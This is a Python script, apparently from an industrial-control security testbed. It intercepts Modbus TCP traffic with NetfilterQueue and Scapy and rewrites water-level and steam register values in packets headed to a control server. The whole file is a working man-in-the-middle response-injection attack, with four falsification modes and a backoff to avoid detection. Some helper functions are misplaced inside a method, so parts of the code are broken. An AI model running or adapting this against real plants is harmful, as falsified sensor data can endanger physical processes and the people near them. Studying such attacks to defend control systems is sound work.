import random
import NetworkEncoder as ne
from netfilterqueue import NetfilterQueue
from pymodbus.client.sync import ModbusTcpClient
from scapy.all import *

MODBUS_SLAVE = 'ms.ics.example.com'

random.seed(100)
response = ''

class RIA():
    def __init__(self):
        #Decreasing to normal
        self.backoffFlag = False

        #Random time between attacks after backoff flag set false
        self.backoff = random.randint(1, 100)

    def run(self):
        f = open("RIAAlteredSeqs.txt", "w+")
        f.write("START\n")
        f.close()
        nfqueue = NetfilterQueue()
        nfqueue.bind(1, self.callback)

        try:
            nfqueue.run()
        except KeyboardInterrupt:
            print('')

        nfqueue.unbind()

    def callback(self, pkt):
        f = open("RIAMode.txt")
        mode = f.readline()
        if mode != 'n':
            self.mitm(mode, pkt)
        else:
            pkt.accept()
        f.close()

    def mitm(self, response, pkt):
        sc_pkt = IP(pkt.get_payload())
        ip_hex = toHex(str(sc_pkt))

        if sc_pkt[IP].dst == MODBUS_SLAVE and sc_pkt[TCP].dport == 502 and ip_hex[118:120] == '10' and ip_hex[124:130] == '001224':
            registers = []

            for i in range(0, 18):
                index = 130 + (4 * i)
                registers.append(int(ip_hex[index:index + 4], 16))

            waterLevel = ne.modbusDecode(0, 4, 4, registers)
            waterTemp = ne.modbusDecode(4, 2, 2, registers)
            powerOut = ne.modbusDecode(6, 6, 2, registers)
            steamStep = ne.modbusDecode(10, 2, 4, registers)
            powerIn = ne.modbusDecode(13, 6, 2, registers)
            serverSeconds = ne.modbusDecode(17, 2, 0, registers)
            response = int(response)

            #Initiate backoff
            if waterLevel >= 600000:
                self.backoffFlag = True
            elif waterLevel <= 505000 and self.backoff == 0:
                self.backoffFlag = False
                self.backoff = random.randint(1, 100)
            else:
                self.backoff -= 1

            if not self.backoffFlag:
                if response == 1:
                    #10,000L below optimal level
                    waterLevel = 500000 - 10000
                    steamStep *= 1.5
                if response == 2:
                    #1,000L below optimal level
                    waterLevel = 500000 - 1000
                if response == 3:
                    # Constantly 1,500L below optimum level +- 15%
                    waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100))
                if response == 4:
                    # Constantly 1,000L below optimum level +- 15% + steamStep
                    waterLevel = 500000 - (1000 * (random.randint(85, 115) / 100)) + steamStep

                f = open("RIAAlteredSeqs.txt", "a")
                f.write(str(sc_pkt[TCP].seq))
                f.write("\n")
                f.close()

            outputs = []
            outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
            outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
            outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
            outputs = ne.modbusEncode(steamStep, 2, 4, outputs)
            outputs = ne.modbusEncode(powerIn, 6, 2, outputs)
            outputs = ne.modbusEncode(serverSeconds, 2, 0, outputs)

            print(outputs)

            payload = ""

            for reg in outputs:
                add = str(hex(reg))[2:]
                for x in range(len(add), 4):
                    add = '0' + str(add)
                payload += self.plx(add[0:2]) + self.plx(add[2:4])

            sc_pkt[Raw].load = sc_pkt[Raw].load[0:13] + payload
            sc_pkt[IP].ttl -= 1
            del sc_pkt[IP].chksum
            del sc_pkt[TCP].chksum
            sc_pkt.show2()
            pkt.set_payload(str(sc_pkt))
            pkt.accept()
        else:
            pkt.accept()

        def toHex(s):
            lst = []
            for ch in s:
                hv = hex(ord(ch)).replace('0x', '')
                if len(hv) == 1:
                    hv = '0' + hv
                lst.append(hv)
            return reduce(lambda x, y: x + y, lst)

        def plx(x):
            val = int(x, 16)
            return chr(val)

ria = RIA()
ria.run()


